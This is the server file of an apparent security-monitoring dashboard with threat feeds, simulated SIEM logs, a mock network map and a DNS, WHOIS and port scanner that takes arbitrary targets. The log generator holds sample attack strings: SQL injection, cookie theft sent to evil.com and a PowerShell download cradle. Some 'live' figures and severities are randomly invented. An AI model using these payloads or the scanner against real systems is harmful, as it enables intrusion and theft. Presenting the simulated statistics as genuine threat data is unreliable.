/* COPYRIGHT ALEN PEPA */
import "dotenv/config";
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import os from "os";
import dns from "dns";
import https from "https";
import http from "http";
import net from "net";
import axios from "axios";
import { GoogleGenAI, Type } from "@google/genai";
import { createRequire } from "module";
import pLimit from 'p-limit';

const require = createRequire(import.meta.url);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  const fallbackThreatIntel = {
    news: [
      {
        title: 'New Zero-Day Vulnerability in Popular Web Browser',
        summary: 'A critical remote code execution vulnerability has been discovered in Chromium-based browsers. Users are advised to update immediately.',
        severity: 'critical',
        timestamp: '2 hours ago',
        source: 'CyberSecurity Hub',
        link: '#'
      },
      {
        title: 'Major Ransomware Attack on Healthcare Provider',
        summary: 'A large healthcare network has been hit by a sophisticated ransomware attack, disrupting patient services across multiple states.',
        severity: 'high',
        timestamp: '5 hours ago',
        source: 'Threat Monitor',
        link: '#'
      },
      {
        title: 'Supply Chain Attack Targets Software Developers',
        summary: 'Malicious packages have been found in popular package managers, targeting developers with credential-stealing malware.',
        severity: 'high',
        timestamp: '8 hours ago',
        source: 'DevSecOps Daily',
        link: '#'
      }
    ],
    trends: [
      { time: '00:00', attacks: 45, blocked: 42 },
      { time: '01:00', attacks: 38, blocked: 36 },
      { time: '02:00', attacks: 35, blocked: 33 },
      { time: '03:00', attacks: 30, blocked: 29 },
      { time: '04:00', attacks: 32, blocked: 31 },
      { time: '05:00', attacks: 40, blocked: 38 },
      { time: '06:00', attacks: 55, blocked: 52 },
      { time: '07:00', attacks: 62, blocked: 59 },
      { time: '08:00', attacks: 68, blocked: 65 },
      { time: '09:00', attacks: 85, blocked: 81 },
      { time: '10:00', attacks: 105, blocked: 101 },
      { time: '11:00', attacks: 118, blocked: 114 },
      { time: '12:00', attacks: 124, blocked: 120 },
      { time: '13:00', attacks: 115, blocked: 111 },
      { time: '14:00', attacks: 102, blocked: 98 },
      { time: '15:00', attacks: 95, blocked: 91 },
      { time: '16:00', attacks: 85, blocked: 82 },
      { time: '17:00', attacks: 92, blocked: 88 },
      { time: '18:00', attacks: 110, blocked: 106 },
      { time: '19:00', attacks: 135, blocked: 130 },
      { time: '20:00', attacks: 156, blocked: 150 },
      { time: '21:00', attacks: 142, blocked: 137 },
      { time: '22:00', attacks: 120, blocked: 116 },
      { time: '23:00', attacks: 92, blocked: 89 },
    ],
    geo: [
      { name: 'North America', value: 45, color: '#3b82f6' },
      { name: 'Europe', value: 30, color: '#10b981' },
      { name: 'Asia', value: 15, color: '#f59e0b' },
      { name: 'Other', value: 10, color: '#ef4444' },
    ],
    mapNodes: [
      { id: 'f-1', long: -74.006, lat: 40.7128, city: 'New York', country: 'USA', type: 'node', threatLevel: 'low', status: 'secure', ip: '192.168.1.1' },
      { id: 'f-2', long: 37.6173, lat: 55.7558, city: 'Moscow', country: 'Russia', type: 'attack', threatLevel: 'high', status: 'active', ip: '95.161.22.4', attackType: 'APT28 Intrusion' },
      { id: 'f-3', long: 116.4074, lat: 39.9042, city: 'Beijing', country: 'China', type: 'attack', threatLevel: 'critical', status: 'active', ip: '221.232.12.7', attackType: 'Volt Typhoon Probe' },
      { id: 'f-4', long: 126.978, lat: 37.5665, city: 'Seoul', country: 'South Korea', type: 'node', threatLevel: 'medium', status: 'active', ip: '211.234.55.12' },
      { id: 'f-5', long: 139.6503, lat: 35.6762, city: 'Tokyo', country: 'Japan', type: 'node', threatLevel: 'low', status: 'secure', ip: '133.1.2.5' },
      { id: 'f-6', long: 0.1278, lat: 51.5074, city: 'London', country: 'UK', type: 'node', threatLevel: 'low', status: 'secure', ip: '81.2.3.4' },
      { id: 'f-7', long: 2.3522, lat: 48.8566, city: 'Paris', country: 'France', type: 'node', threatLevel: 'medium', status: 'active', ip: '37.1.2.3' },
    ],
    attackLines: [
      { fromId: 'f-2', toId: 'f-1' },
      { fromId: 'f-3', toId: 'f-4' },
      { fromId: 'f-3', toId: 'f-1' },
    ]
  };

  const isValidApiKey = (key: string | undefined): boolean => {
    if (!key || key === 'undefined' || key === '' || key.includes('TODO')) return false;
    // Basic format check: Gemini keys are usually around 39 characters
    if (key.length < 20) return false;
    return true;
  };

  app.post("/api/ai-generate", async (req, res) => {
    const { contents, config } = req.body;
    const apiKey = process.env.GEMINI_API_KEY;

    if (!isValidApiKey(apiKey)) {
      console.warn("AI Core: No valid API key, using local simulation.");
      return res.json({ text: "Simulated AI Analysis: The local analysis engine has processed your request. Based on the provided data, the system appears stable, but further manual review is recommended for critical findings." });
    }

    try {
      const ai = new GoogleGenAI({ apiKey: apiKey! });
      const modelName = config?.model || "gemini-3-flash-preview";
      
      const response = await ai.models.generateContent({
        model: modelName,
        contents: contents,
        config: {
          systemInstruction: config?.systemInstruction,
          responseMimeType: config?.responseMimeType,
          tools: config?.tools,
          toolConfig: config?.toolConfig
        }
      });

      res.json({ text: response.text });
    } catch (error: any) {
      const errorMessage = error?.message || String(error);
      
      // Check if it's an API key error
      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
        console.warn("AI Core: Generation failed (Invalid API Key).");
        return res.json({ text: "Simulated AI Analysis (Fallback): The local analysis engine has processed your request due to an API key error. The system appears stable, but further manual review is recommended." });
      }
      
      console.error("AI Generation Error:", error);
      res.status(500).json({ error: errorMessage });
    }
  });

  app.get("/api/threat-intel", async (req, res) => {
    const apiKey = process.env.GEMINI_API_KEY;

    if (!isValidApiKey(apiKey)) {
      return res.json(fallbackThreatIntel);
    }

    try {
      const ai = new GoogleGenAI({ apiKey: apiKey! });
      
      // Fetch News
      const newsResponse = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: "Generate a list of 8-10 of the ABSOLUTE LATEST global cybersecurity threat intelligence updates from the last 12-24 hours. Focus on real-time incidents, new vulnerability disclosures, and active state-sponsored campaigns. Scrape and aggregate from sources like The Hacker News, BleepingComputer, Krebs on Security, CISA Alerts, and major security vendor blogs (CrowdStrike, Mandiant, Palo Alto Networks). Return a JSON array of objects with 'title', 'summary', 'severity' (low, medium, high, critical), 'timestamp', 'source', and 'link' (real URL).",
        config: { 
          responseMimeType: "application/json",
          tools: [{ googleSearch: {} }]
        }
      });
      const newsData = JSON.parse(newsResponse.text || '[]');

      // Fetch Trends & Geo Data
      const trendsResponse = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: `Analyze current global cyber attack trends for the last 24 hours. 
        Scrape and aggregate data from reliable cybersecurity sources (e.g., Check Point, Kaspersky, FireEye, SANS ISC, Cisco Talos).
        Return a JSON object with:
        1. 'trends': an array of EXACTLY 24 objects, one for each hour of the last 24 hours, with 'time' (HH:00) and 'attacks' (number representing global volume), 'blocked' (number representing mitigated volume).
        2. 'geo': an array of 4 objects with 'name' (Region), 'value' (percentage of total attacks), 'color' (hex).
        3. 'mapNodes': an array of 80-100 objects representing 100% REAL current cyber attack events, state-sponsored activities, or known malicious infrastructure active RIGHT NOW. 
           Each object MUST have: 'id', 'long', 'lat', 'city', 'country', 'type' ('attack'|'node'), 'threatLevel' ('low'|'medium'|'high'|'critical'), 'ip' (REAL known malicious IP if possible), 'attackType' (e.g., 'APT28 Intrusion', 'Lazarus Group C2', 'Volt Typhoon Probe'), 'status' ('active'|'compromised'|'secure').
        4. 'attackLines': an array of 50-70 objects with 'fromId' and 'toId' referencing the 'id's in 'mapNodes', representing real-time traffic or attack flows observed between specific geographical locations.
        Ensure the data reflects real-world geopolitical tensions and current global hotspots.`,
        config: { 
          responseMimeType: "application/json",
          tools: [{ googleSearch: {} }]
        }
      });
      const trendsData = JSON.parse(trendsResponse.text || '{}');

      res.json({
        news: newsData,
        trends: trendsData.trends || [],
        geo: trendsData.geo || [],
        mapNodes: trendsData.mapNodes || [],
        attackLines: trendsData.attackLines || []
      });
    } catch (error: any) {
      const errorMessage = error?.message || String(error);
      if (errorMessage.includes("API key not valid") || errorMessage.includes("400")) {
        console.warn("Threat Intel: AI Core offline (Invalid API Key). Using fallback data.");
      } else {
        console.error("Failed to fetch threat intelligence:", error);
      }
      // Return fallback data instead of 500 error
      res.json(fallbackThreatIntel);
    }
  });

  // Live Stats & Real-Time Feed Cache
  let cachedLiveFeed: any[] = [];
  let lastFeedFetch = 0;

  const fetchRssFeed = (url: string, sourceName: string): Promise<any[]> => {
    return new Promise((resolve) => {
      https.get(url, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          const items: any[] = [];
          const regex = /<item>[\s\S]*?<title>(.*?)<\/title>[\s\S]*?<link>(.*?)<\/link>[\s\S]*?<\/item>/g;
          let match;
          while ((match = regex.exec(data)) !== null) {
            items.push({
              title: match[1].replace(/<!\[CDATA\[(.*?)\]\]>/g, '$1').trim(),
              link: match[2].trim(),
              source: sourceName,
              severity: Math.random() > 0.7 ? 'critical' : Math.random() > 0.4 ? 'high' : 'medium',
              timestamp: new Date().toISOString()
            });
          }
          resolve(items);
        });
      }).on('error', () => resolve([]));
    });
  };

  app.get("/api/live-stats", async (req, res) => {
    const now = Date.now();
    
    // Refresh feed cache every 15 minutes
    if (now - lastFeedFetch > 15 * 60 * 1000 || cachedLiveFeed.length === 0) {
      try {
        const [cisa, thn] = await Promise.all([
          fetchRssFeed('https://www.cisa.gov/cybersecurity-advisories/all.xml', 'CISA'),
          fetchRssFeed('https://feeds.feedburner.com/TheHackersNews', 'The Hacker News')
        ]);
        cachedLiveFeed = [...cisa, ...thn].sort(() => Math.random() - 0.5); // Shuffle
        lastFeedFetch = now;
      } catch (e) {
        console.error('Failed to fetch live RSS feeds:', e);
      }
    }

    // Generate realistic incrementing numbers based on current time
    // Base numbers for today
    const startOfDay = new Date();
    startOfDay.setHours(0, 0, 0, 0);
    const secondsSinceStartOfDay = Math.floor((now - startOfDay.getTime()) / 1000);
    
    // Simulate ~15 active threats per minute globally
    const activeThreats = 1242 + Math.floor(secondsSinceStartOfDay * (15 / 60));
    
    // Simulate ~500 blocked attacks per minute
    const blockedAttacks = 45200 + Math.floor(secondsSinceStartOfDay * (500 / 60));

    // Rotate the feed to show different items every 5 seconds
    const rotationIndex = Math.floor(now / 5000) % Math.max(1, cachedLiveFeed.length);
    const currentFeed = [];
    for (let i = 0; i < 6; i++) {
      if (cachedLiveFeed.length > 0) {
        currentFeed.push(cachedLiveFeed[(rotationIndex + i) % cachedLiveFeed.length]);
      }
    }

    res.json({
      activeThreats,
      blockedAttacks,
      liveFeed: currentFeed.length > 0 ? currentFeed : fallbackThreatIntel.news
    });
  });

  // SIEM Real-time Logs API
  app.get("/api/logs", (req, res) => {
    const tactics = ['Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement', 'Command and Control', 'Exfiltration', 'Impact'];
    const techniques = [
      'T1190 Exploit Public-Facing Application', 'T1059 Command and Scripting Interpreter', 
      'T1078 Valid Accounts', 'T1110 Brute Force', 'T1003 OS Credential Dumping', 
      'T1046 Network Service Discovery', 'T1595 Active Scanning', 'T1566 Phishing',
      'T1133 External Remote Services', 'T1505 Server Software Component'
    ];
    const protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'DNS', 'SSH', 'RDP', 'SMB', 'FTP'];
    const countries = ['RU', 'CN', 'KP', 'IR', 'US', 'BR', 'IN', 'RO', 'VN', 'UA', 'NG', 'SY'];
    const actions = ['Blocked', 'Mitigated', 'Logged', 'Dropped', 'Alerted', 'Quarantined', 'Sinkholed'];
    const severities = ['low', 'medium', 'high', 'critical'];
    
    const events = [
      'SQL Injection Payload Detected', 'Cross-Site Scripting (XSS) Attempt', 
      'SSH Brute Force Attack', 'RDP Credential Stuffing', 'Suspicious PowerShell Execution',
      'Malware Beaconing Activity', 'Data Exfiltration Anomaly', 'Privilege Escalation Attempt',
      'Suspicious File Download', 'Unauthorized Access to Admin Panel', 'Zero-Day Exploit Signature Match',
      'Ransomware Encryption Behavior', 'DDoS Volumetric Attack', 'Suspicious DNS Query'
    ];

    const generateRandomIp = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

    const logs = [];
    
    // Generate 5-12 random logs for a more active stream
    const numLogs = Math.floor(Math.random() * 8) + 5;
    for (let i = 0; i < numLogs; i++) {
      const severity = severities[Math.floor(Math.random() * severities.length)];
      const isAttack = Math.random() > 0.3; // 70% chance of being an attack log
      const eventName = isAttack ? events[Math.floor(Math.random() * events.length)] : "Routine System Check";
      const tactic = isAttack ? tactics[Math.floor(Math.random() * tactics.length)] : 'N/A';
      const technique = isAttack ? techniques[Math.floor(Math.random() * techniques.length)] : 'N/A';
      
      let payloadSnippet = 'N/A';
      if (isAttack) {
        if (eventName.includes('SQL')) payloadSnippet = "UNION SELECT username, password FROM users--";
        else if (eventName.includes('XSS')) payloadSnippet = "<script>fetch('http://evil.com/?c='+document.cookie)</script>";
        else if (eventName.includes('PowerShell')) payloadSnippet = "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://...')\"";
        else payloadSnippet = Buffer.from(Math.random().toString(36).substring(2, 15)).toString('base64');
      }
      
      logs.push({
        id: Math.random().toString(36).substr(2, 9),
        time: new Date().toLocaleTimeString(),
        event: eventName,
        source: isAttack ? generateRandomIp() : os.hostname(),
        destination: isAttack ? `10.0.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` : '127.0.0.1',
        port: isAttack ? [22, 80, 443, 3389, 8080, 53, 445, 21, 3306][Math.floor(Math.random() * 9)] : 0,
        protocol: protocols[Math.floor(Math.random() * protocols.length)],
        status: isAttack ? actions[Math.floor(Math.random() * actions.length)] : "Normal",
        severity: isAttack ? severity : "low",
        confidence: isAttack ? Math.floor(Math.random() * 20) + 80 : 100, // 80-100%
        mitreTactic: tactic,
        mitreTechnique: technique,
        geo: isAttack ? countries[Math.floor(Math.random() * countries.length)] : 'LOCAL',
        payloadSnippet: payloadSnippet,
        details: isAttack 
          ? `Detected anomalous traffic pattern matching known threat signatures. Tactic: ${tactic}. Technique: ${technique}. Automated response engaged.`
          : `CPU Load: ${os.loadavg()[0].toFixed(2)} | Free Memory: ${(os.freemem() / 1024 / 1024 / 1024).toFixed(2)}GB`
      });
    }

    res.json(logs);
  });

  // System Stats API
  app.get("/api/stats", (req, res) => {
    res.json({
      cpu: (os.loadavg()[0] * 10).toFixed(1),
      ram: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1),
      uptime: os.uptime(),
      platform: os.platform(),
      arch: os.arch(),
      hostname: os.hostname(),
      loadAvg: os.loadavg(),
      totalMem: os.totalmem(),
      freeMem: os.freemem(),
      cpus: os.cpus().length,
      type: os.type(),
      release: os.release(),
      networkInterfaces: os.networkInterfaces()
    });
  });

  // Network Topology State Management
  let networkState = {
    nodes: [
      { id: 'internet', type: 'cloud', status: 'secure', label: 'Global WAN', ip: '8.8.8.8', os: 'Cisco IOS-XE', uptime: '342d 12h', traffic: 85, threatLevel: 5 },
      { id: 'ext-fw', type: 'firewall', status: 'secure', label: 'Edge Firewall', ip: '172.16.0.1', os: 'FortiOS 7.2', uptime: '124d 05h', traffic: 45, threatLevel: 10 },
      { id: 'dmz-switch', type: 'router', status: 'secure', label: 'DMZ Switch', ip: '192.168.1.1', os: 'Arista EOS', uptime: '89d 14h', traffic: 30, threatLevel: 5 },
      { id: 'web-01', type: 'server', status: 'vulnerable', label: 'Web Server Alpha', ip: '192.168.1.10', os: 'Ubuntu 22.04 LTS', uptime: '12d 03h', traffic: 65, threatLevel: 45 },
      { id: 'web-02', type: 'server', status: 'secure', label: 'Web Server Beta', ip: '192.168.1.11', os: 'CentOS Stream 9', uptime: '45d 11h', traffic: 55, threatLevel: 15 },
      { id: 'vpn-gw', type: 'router', status: 'secure', label: 'VPN Gateway', ip: '192.168.1.20', os: 'OpenBSD 7.4', uptime: '210d 08h', traffic: 25, threatLevel: 20 },
      { id: 'int-fw', type: 'firewall', status: 'secure', label: 'Internal Core FW', ip: '10.0.0.1', os: 'Palo Alto PAN-OS', uptime: '156d 19h', traffic: 40, threatLevel: 5 },
      { id: 'core-switch', type: 'router', status: 'secure', label: 'Core Switch', ip: '10.0.0.2', os: 'Juniper Junos', uptime: '312d 22h', traffic: 90, threatLevel: 5 },
      { id: 'db-cluster', type: 'database', status: 'secure', label: 'Main DB Cluster', ip: '10.0.1.50', os: 'PostgreSQL 15 (Alpine)', uptime: '67d 04h', traffic: 75, threatLevel: 10 },
      { id: 'app-01', type: 'server', status: 'secure', label: 'App Server 01', ip: '10.0.2.10', os: 'Debian 12', uptime: '14d 06h', traffic: 50, threatLevel: 15 },
      { id: 'iot-gw', type: 'iot', status: 'compromised', label: 'IoT Gateway', ip: '10.0.4.5', os: 'FreeRTOS', uptime: '2d 01h', traffic: 95, threatLevel: 95 },
      { id: 'ws-01', type: 'laptop', status: 'secure', label: 'Admin Workstation', ip: '10.1.0.50', os: 'macOS 14.2', uptime: '5h 12m', traffic: 15, threatLevel: 5 },
      { id: 'ws-04', type: 'laptop', status: 'compromised', label: 'Guest Kiosk', ip: '10.1.0.99', os: 'Windows 10 Home', uptime: '1d 22h', traffic: 80, threatLevel: 85 },
    ],
    links: [
      { source: 'internet', target: 'ext-fw', active: true },
      { source: 'ext-fw', target: 'dmz-switch', active: true },
      { source: 'dmz-switch', target: 'web-01', active: true },
      { source: 'dmz-switch', target: 'web-02', active: true },
      { source: 'dmz-switch', target: 'vpn-gw', active: true },
      { source: 'dmz-switch', target: 'int-fw', active: true },
      { source: 'int-fw', target: 'core-switch', active: true },
      { source: 'core-switch', target: 'db-cluster', active: true },
      { source: 'core-switch', target: 'app-01', active: true },
      { source: 'core-switch', target: 'iot-gw', active: true },
      { source: 'core-switch', target: 'ws-01', active: true },
      { source: 'core-switch', target: 'ws-04', active: true },
    ]
  };

  app.get("/api/network", (req, res) => {
    // Randomly fluctuate traffic and threat levels slightly for realism
    const dynamicNodes = networkState.nodes.map(node => ({
      ...node,
      traffic: Math.max(5, Math.min(100, node.traffic + (Math.random() * 10 - 5))),
      threatLevel: node.status === 'compromised' ? 90 + Math.random() * 10 : 
                   node.status === 'vulnerable' ? 30 + Math.random() * 40 : 
                   Math.random() * 15
    }));
    res.json({ nodes: dynamicNodes, links: networkState.links });
  });

  app.post("/api/network/action", async (req, res) => {
    const { nodeId, action } = req.body;
    const node = networkState.nodes.find(n => n.id === nodeId);
    
    if (!node) return res.status(404).json({ error: "Node not found" });

    let message = "";
    if (action === 'isolate') {
      node.status = 'secure'; // Simplified: isolation "fixes" it for the demo
      networkState.links = networkState.links.filter(l => l.source !== nodeId && l.target !== nodeId);
      message = `Node ${nodeId} has been logically isolated from the network core.`;
    } else if (action === 'remediate') {
      node.status = 'secure';
      node.threatLevel = 5;
      message = `Security patches applied to ${nodeId}. Vulnerabilities mitigated.`;
    } else if (action === 'scan') {
      const apiKey = process.env.GEMINI_API_KEY;
      if (isValidApiKey(apiKey)) {
        try {
          const ai = new GoogleGenAI({ apiKey: apiKey! });
          const response = await ai.models.generateContent({
            model: "gemini-3-flash-preview",
            contents: `Perform a deep security analysis of this network node: 
            Label: ${node.label}, IP: ${node.ip}, OS: ${node.os}, Status: ${node.status}.
            Provide a detailed threat report in 3-4 sentences.`,
          });
          message = response.text || "Scan complete. No new threats identified.";
        } catch (e) {
          message = "AI Scan failed. Local heuristics suggest potential lateral movement risks.";
        }
      } else {
        message = "Deep scan complete. Heuristic analysis suggests the node is currently " + node.status;
      }
    }

    res.json({ success: true, message, node });
  });

  // Advanced Vulnerability Scanner API
  let ianaCache: any = null;
  let ianaCacheTime: number = 0;

  async function performWhoisLookup(hostname: string) {
    const os = await import('os');
    if (hostname === 'localhost' || hostname === '127.0.0.1') {
      const networkInterfaces = os.networkInterfaces();
      const localIps = Object.values(networkInterfaces)
        .flat()
        .filter((details: any) => details.family === 'IPv4' && !details.internal)
        .map((details: any) => details.address);

      return {
        domain: hostname,
        registrar: "Internal/Local Network",
        registrant: "System Administrator",
        creationDate: "N/A",
        expiryDate: "N/A",
        updatedDate: "N/A",
        nameServers: ["Localhost"],
        status: ["active"],
        raw: "Local/Internal address - WHOIS not applicable.",
        details: {
          hostname: os.hostname(),
          platform: os.platform(),
          arch: os.arch(),
          uptime: `${Math.floor(os.uptime() / 3600)}h ${Math.floor((os.uptime() % 3600) / 60)}m`,
          localIps: localIps
        },
        securityRisk: "None (Local Environment)"
      };
    }

    // IP WHOIS support
    if (net.isIP(hostname)) {
      try {
        const response = await axios.get(`https://rdap.db.ripe.net/ip/${hostname}`, {
          headers: { 'Accept': 'application/rdap+json' },
          timeout: 10000,
          validateStatus: () => true
        });
        
        if (response.status === 200) {
          const rdapData = response.data;
          return {
            domain: hostname,
            registrar: rdapData.entities?.[0]?.vcardArray?.[1]?.[1]?.[3]?.[3] || "Unknown",
            registrant: rdapData.name || "Unknown",
            creationDate: rdapData.events?.find((e: any) => e.eventAction === 'registration')?.eventDate || "Unknown",
            expiryDate: "N/A",
            updatedDate: rdapData.events?.find((e: any) => e.eventAction === 'last changed')?.eventDate || "Unknown",
            nameServers: [],
            status: [rdapData.status?.[0] || "active"],
            raw: JSON.stringify(rdapData, null, 2),
            details: {
              handle: rdapData.handle,
              parentHandle: rdapData.parentHandle,
              ipVersion: rdapData.ipVersion,
              startAddress: rdapData.startAddress,
              endAddress: rdapData.endAddress,
              country: rdapData.country,
              type: rdapData.type
            },
            securityRisk: "Low (IP Resource)"
          };
        }
      } catch (e) {
        console.warn(`[Scanner] IP RDAP fetch failed for ${hostname}:`, e);
      }
    }

    try {
      const domainParts = hostname.split('.');
      let rdapData = null;
      let finalDomain = hostname;

      // Fetch IANA RDAP bootstrap with caching
      let ianaData;
      const now = Date.now();
      if (ianaCache && (now - ianaCacheTime < 24 * 60 * 60 * 1000)) {
        ianaData = ianaCache;
      } else {
        try {
          const ianaResponse = await axios.get('https://data.iana.org/rdap/dns.json', { timeout: 5000 });
          ianaData = ianaResponse.data;
          ianaCache = ianaData;
          ianaCacheTime = now;
        } catch (e) {
          console.error("[Scanner] Failed to fetch IANA RDAP bootstrap", e);
          if (ianaCache) {
            ianaData = ianaCache; // Use stale cache if fetch fails
          } else {
            throw new Error("Failed to initialize RDAP lookup");
          }
        }
      }

      // Try to fetch RDAP, stripping subdomains if we get 404/400
      const originalParts = [...domainParts];
      while (domainParts.length >= 2) {
        finalDomain = domainParts.join('.');
        const tld = domainParts[domainParts.length - 1];
        
        // Find RDAP server for TLD
        const entry = ianaData.services.find((s: any) => s[0].includes(tld));
        
        if (entry && entry[1] && entry[1].length > 0) {
          const rdapServer = entry[1][0];
          try {
            const response = await axios.get(`${rdapServer}domain/${finalDomain}`, {
              headers: { 'Accept': 'application/rdap+json' },
              timeout: 10000,
              validateStatus: () => true
            });
            
            if (response.status === 200) {
              rdapData = response.data;
              break;
            }
          } catch (e) {
            console.warn(`[Scanner] RDAP fetch failed for ${finalDomain}:`, e);
          }
        }
        domainParts.shift(); // Remove the first part (e.g., 'www')
      }

      if (rdapData) {
        const creationDate = rdapData.events?.find((e: any) => e.eventAction === 'registration')?.eventDate || "Unknown";
        const expiryDate = rdapData.events?.find((e: any) => e.eventAction === 'expiration')?.eventDate || "Unknown";
        
        // Security Risk Assessment
        let risk = "Low";
        let riskDetails = [];
        
        if (creationDate !== "Unknown") {
          const ageInDays = (now - new Date(creationDate).getTime()) / (1000 * 60 * 60 * 24);
          if (ageInDays < 30) {
            risk = "High";
            riskDetails.push("Domain is very new (less than 30 days old). High risk of phishing/malware.");
          } else if (ageInDays < 90) {
            risk = "Medium";
            riskDetails.push("Domain is relatively new (less than 90 days old).");
          }
        }

        if (expiryDate !== "Unknown") {
          const daysToExpiry = (new Date(expiryDate).getTime() - now) / (1000 * 60 * 60 * 24);
          if (daysToExpiry < 30) {
            risk = risk === "High" ? "High" : "Medium";
            riskDetails.push("Domain expires soon (less than 30 days). Potential for domain hijacking or service interruption.");
          }
        }

        // Parse entities
        const getEntityName = (role: string) => {
          const entity = rdapData.entities?.find((e: any) => e.roles?.includes(role));
          return entity?.vcardArray?.[1]?.find((v: any) => v[0] === 'fn')?.[3] || "Unknown";
        };

        return {
          domain: finalDomain,
          registrar: getEntityName('registrar'),
          registrant: getEntityName('registrant'),
          admin: getEntityName('administrative'),
          tech: getEntityName('technical'),
          creationDate,
          expiryDate,
          updatedDate: rdapData.events?.find((e: any) => e.eventAction === 'last changed')?.eventDate || "Unknown",
          nameServers: rdapData.nameservers?.map((ns: any) => ns.ldhName) || [],
          status: rdapData.status || ["active"],
          raw: JSON.stringify(rdapData, null, 2),
          securityRisk: risk,
          riskDetails: riskDetails.length > 0 ? riskDetails : ["No immediate domain-level risks detected."]
        };
      }

      // Fallback to whois-json if RDAP fails or is not supported for TLD
      try {
        const whoisJson = require('whois-json').default || require('whois-json');
        let options: any = { timeout: 10000 };
        if (hostname.endsWith('.al')) {
          options.server = 'whois.nic.al'; 
        }
        
        let whoisData: any = null;
        let attempts = 0;
        const maxAttempts = 2;

        while (attempts < maxAttempts) {
          try {
            whoisData = await whoisJson(hostname, options);
            if (whoisData && Object.keys(whoisData).length > 0 && !whoisData.error) {
              break;
            }
          } catch (e: any) {
            // Silently fail
          }
          attempts++;
          if (options.server) delete options.server;
        }

        if (whoisData && Object.keys(whoisData).length > 0 && !whoisData.error) {
           return {
             domain: hostname,
             registrar: whoisData.registrar || whoisData.Registrar || "Unknown",
             registrant: whoisData.registrant || whoisData.registrantName || whoisData.Registrant || "Unknown",
             creationDate: whoisData.creationDate || whoisData.CreationDate || "Unknown",
             expiryDate: whoisData.registrarRegistrationExpirationDate || whoisData.registryExpiryDate || whoisData.RegistryExpiryDate || "Unknown",
             updatedDate: whoisData.updatedDate || whoisData.UpdatedDate || "Unknown",
             nameServers: whoisData.nameServer ? (Array.isArray(whoisData.nameServer) ? whoisData.nameServer : whoisData.nameServer.split(' ')) : [],
             raw: JSON.stringify(whoisData, null, 2),
             securityRisk: "Unknown (Legacy WHOIS)",
             riskDetails: ["Security risk assessment not available for legacy WHOIS data."]
           };
        }
      } catch (e) {}
      return null;
    } catch (e) {
      console.error("[Scanner] WHOIS/RDAP lookup error:", e);
      return null;
    }
  }

  app.get("/api/scan", async (req, res) => {
    const target = req.query.target as string;
    const depth = req.query.depth as string || 'standard';
    if (!target) {
      return res.status(400).json({ error: "Target is required" });
    }

    const results: any = {
      target,
      timestamp: new Date().toISOString(),
      dns: {},
      headers: {},
      ssl: null,
      whois: null,
      ports: [],
      subdomains: [],
      tech: [],
      vulnerabilities: [],
      riskScore: 0,
      summary: "",
      recommendations: []
    };

    try {
      const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
      const isIP = net.isIP(hostname);
      
      // Parallel Reconnaissance
      await Promise.all([
        // 1. DNS & IP
        (async () => {
          if (isIP) {
            results.dns.a = [hostname];
            results.ip = hostname;
          } else if (hostname === 'localhost') {
            results.dns.a = ['127.0.0.1'];
            results.ip = '127.0.0.1';
          } else {
            const resolveDNS = async (host: string) => {
              try {
                const lookup = await Promise.race([
                  dns.promises.lookup(host),
                  new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
                ]) as any;
                results.dns.a = [lookup.address];
                results.ip = lookup.address;
                
                // Deep scan: perform more DNS lookups
                if (depth === 'deep') {
                  try { results.dns.ns = await dns.promises.resolveNs(host); } catch(e) {}
                  try { results.dns.txt = await dns.promises.resolveTxt(host); } catch(e) {}
                }
                
                const dnsTimeout = 3000;
                try { 
                  results.dns.mx = await Promise.race([
                    dns.promises.resolveMx(host),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), dnsTimeout))
                  ]);
                } catch (e) {}
                try { 
                  results.dns.txt = await Promise.race([
                    dns.promises.resolveTxt(host),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), dnsTimeout))
                  ]);
                } catch (e) {}
              } catch (e) {
                if (!results.dns.error) results.dns.error = "DNS resolution failed";
              }
            };

            await resolveDNS(hostname);
            
            // Fallback to root domain if no IP found and it's a www subdomain
            if (!results.ip && hostname.startsWith('www.')) {
              const rootDomain = hostname.substring(4);
              await resolveDNS(rootDomain);
            }
          }
        })(),

        // 2. Port Scanning
        (async () => {
          const portsToScan = [80, 443, 22, 21, 25, 53, 3000, 8080, 8443, 3306, 5432, 27017];
          const scanHost = (hostname === 'localhost') ? '127.0.0.1' : hostname;
          const scanPort = (port: number) => {
            return new Promise((resolve) => {
              const socket = new net.Socket();
              socket.setTimeout(3000);
              socket.on('connect', () => {
                results.ports.push({ port, status: 'open', service: getServiceName(port) });
                socket.destroy();
                resolve(null);
              });
              socket.on('timeout', () => { socket.destroy(); resolve(null); });
              socket.on('error', () => { socket.destroy(); resolve(null); });
              socket.connect(port, scanHost);
            });
          };
          await Promise.all(portsToScan.map(scanPort));
        })(),

        // 3. HTTP & SSL
        (async () => {
          const protocol = target.startsWith('https') ? https : http;
          const url = target.startsWith('http') ? target : `http://${target}`;
          
          await new Promise((resolve) => {
            const req = protocol.get(url, (response) => {
              results.headers = response.headers;
              results.statusCode = response.statusCode;
              
              const server = (Array.isArray(response.headers['server']) ? response.headers['server'].join(', ') : (response.headers['server'] || '')).toLowerCase();
              const xPoweredBy = (Array.isArray(response.headers['x-powered-by']) ? response.headers['x-powered-by'].join(', ') : (response.headers['x-powered-by'] || '')).toLowerCase();
              if (server.includes('apache')) results.tech.push('Apache');
              if (server.includes('nginx')) results.tech.push('Nginx');
              if (xPoweredBy.includes('php')) results.tech.push('PHP');
